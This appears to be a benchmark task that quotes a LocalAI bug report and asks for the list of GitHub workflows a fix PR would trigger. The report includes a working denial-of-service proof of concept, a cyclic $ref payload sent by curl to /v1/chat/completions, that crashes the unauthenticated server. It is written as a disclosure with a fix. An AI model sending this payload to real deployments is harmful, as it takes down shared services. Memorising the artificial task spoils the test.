# Recover the symbolic verification state this change produces

A regression report was filed against `mudler/LocalAI`.  The report is quoted verbatim below.

## Report

```
Bug 6: Cyclic JSON-Schema `$ref` in function-calling grammar causes unbounded recursion and a full-process crash

**LocalAI version:**
commit `05b8d8aa` (2026-07-14, master)

**Environment, CPU architecture, OS, and Version:**
Linux x86_64. Docker container built from the repo Dockerfile with `-race` instrumentation. Not architecture specific.

**Describe the bug**

`JSONSchemaConverter.visit()` (`pkg/functions/grammars/json_schema.go:63,122`) converts a JSON-Schema into a GBNF grammar for function calling. It resolves `$ref` entries by recursively calling itself, with no cycle detection and no recursion depth limit.

`POST /v1/chat/completions` accepts a client-supplied `grammar_json_functions` schema. `core/http/endpoints/openai/chat.go` calls `input.JSONFunctionGrammarObject.Grammar(...)` synchronously in the HTTP handler, before any backend call. If the schema's `$defs` contains a self-referencing entry such as `"A": {"$ref": "#/$defs/A"}`, `visit()` recurses into that cycle forever until the goroutine stack is exhausted, producing an unrecoverable Go fatal error (`fatal error: stack overflow`) that kills the entire process, not just the request.

This same converter and PEG-based JSON parser variant are reachable through many independent call paths (chat completions, realtime `response.create`, llama3.1 schema handling, the PEG JSON parser), so the same root cause is confirmed across 11 separate PoCs in the underlying audit. This report reproduces it through the most direct path, `POST /v1/chat/completions` with a cyclic `grammar_json_functions`.

**To Reproduce**

```bash
mkdir -p /tmp/localai-poc-bug6 && cd /tmp/localai-poc-bug6

cat > model.yaml <<'EOF'
name: mock-model
backend: mock-backend
parameters:
  model: mock-model.bin
EOF

cat > payload.json <<'EOF'
{
  "model": "mock-model",
  "stream": false,
  "messages": [{"role": "user", "content": "hi"}],
  "grammar_json_functions": {
    "$defs": {"A": {"$ref": "#/$defs/A"}},
    "oneOf": [{"type": "object", "properties": {"x": {"$ref": "#/$defs/A"}}}]
  }
}
EOF

docker network create localai-audit-net 2>/dev/null || true

mkdir -p models
cp model.yaml models/mock-model.yaml

docker run -d --rm --network localai-audit-net \
  --name laudit-victim \
  -p 0:8080 -v "$PWD/models:/models" \
  localai-audit:latest run --address 0.0.0.0:8080 \
  --models-path /models --api-keys "" \
  --external-grpc-backends "mock-backend:/usr/local/bin/mock-backend"

sleep 5
PORT=$(docker port laudit-victim 8080 | head -1 | sed 's/.*://')

echo "=== baseline request (should succeed) ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\n' \
  -X POST "http://127.0.0.1:$PORT/v1/chat/completions" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","messages":[{"role":"user","content":"hello"}],"stream":false}'

docker logs -f laudit-victim > /tmp/victim-logstream.log 2>&1 &
LOGPID=$!

echo "=== attack request (cyclic \$ref) ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\nCURL_EXIT=%{exitcode}\n' \
  -X POST "http://127.0.0.1:$PORT/v1/chat/completions" \
  -H 'Content-Type: application/json' \
  -d @payload.json

sleep 2
kill "$LOGPID" 2>/dev/null
docker inspect -f '{{.State.Running}}' laudit-victim 2>&1
cat /tmp/victim-logstream.log
```

**Expected behavior**

A cyclic `$ref` schema should be rejected during validation, or the converter should enforce a recursion depth limit and return an error, without ever crashing the process.

**Logs**

```
=== attack request (cyclic $ref) ===
curl: (52) Empty reply from server
HTTP_STATUS=000
CURL_EXIT=52

fatal error: stack overflow

runtime stack:
runtime.throw({0x69a2758?, 0x45f701?})
	/usr/local/go/src/runtime/panic.go:1229 +0x48
runtime.newstack()
	/usr/local/go/src/runtime/stack.go:1178 +0x5fd

goroutine 353 [running]:
github.com/mudler/LocalAI/pkg/functions/grammars.(*JSONSchemaConverter).visit(0xc0012fad10, 0xc000e00360, {0xc00360a9a8, 0x8}, 0xc000966e40)
	/src/pkg/functions/grammars/json_schema.go:122 +0x511
github.com/mudler/LocalAI/pkg/functions/grammars.(*JSONSchemaConverter).visit(0xc0012fad10, 0xc000e00360, {0xc00360a9a8, 0x8}, 0xc000966e40)
	/src/pkg/functions/grammars/json_schema.go:122 +0x511
github.com/mudler/LocalAI/pkg/functions/grammars.(*JSONSchemaConverter).visit(0xc0012fad10, 0xc000e00360, {0xc00360a9a8, 0x8}, 0xc000966e40)
	/src/pkg/functions/grammars/json_schema.go:122 +0x511
[... thousands of repeated frames ...]
```

**Additional context**

A baseline request with no malicious grammar returns HTTP 200 and the container stays up. The attack request instead gets `curl: (52) Empty reply from server`, and the container disappears immediately after (started with `--rm`). A background `docker logs -f` stream captured the fatal error before removal, confirming a genuine unrecoverable Go runtime crash, not a caught panic. Prior audit verdict: `VERIFIED_CRASH`.

### Impact

A single unauthenticated `POST /v1/chat/completions` request with a self-referencing `$ref` in `grammar_json_functions` crashes the entire `local-ai` process. Because this is a Go fatal error, not a panic, Echo's recover middleware cannot catch it, and every other in-flight request and tenant on the same process goes down with it. The same unbounded-recursion defect is reachable through at least 10 other independent code paths that funnel into the same JSON-Schema/GBNF conversion or the PEG JSON parser, including realtime `response.create` and llama3.1 schema handling.

### Fix

Add cycle detection (a visited-set keyed by `$ref` pointer) and a hard recursion depth limit in `JSONSchemaConverter.visit()`, returning an error instead of recursing further once the limit is hit. Apply the same fix to the PEG-based JSON parser variant, since it shares the same defect.
```

## What you have

- `/testbed/repo` is the repository checked out at the **pre-change** commit `49ef40a1877f15612fa49a0f917e5c2fe8a28293`.  There
  is no git history: read the files directly.
- The pull request that actually fixed this issue is **not** in the container and cannot be fetched.

## Evaluation context

Assume the prospective fix has just **updated an existing non-draft pull request**.

- PR lifecycle action: `synchronize`
- target branch: `master`
- consider both `pull_request` and `pull_request_target` trigger families
- apply the repository's native `types`, `branches`, `branches-ignore`, `paths`, `paths-ignore`
- direct workflow activation only; no push/workflow_dispatch/schedule/workflow_run

## What to produce

Write JSON to `/testbed/answer.json`:

```json
{"case_id": "mudler_LocalAI__11020__49ef40a",
  "activated_workflows": [".github/workflows/test.yml"]}
```

- list every workflow under `repo/.github/workflows/` that this change would activate
- workflow paths exactly as under `repo/.github/workflows/`; a path that does not exist scores 0

## Rules

- Do **not** use the network. Fetching the upstream fix is cheating and is detected.
- Solve it from the repository.
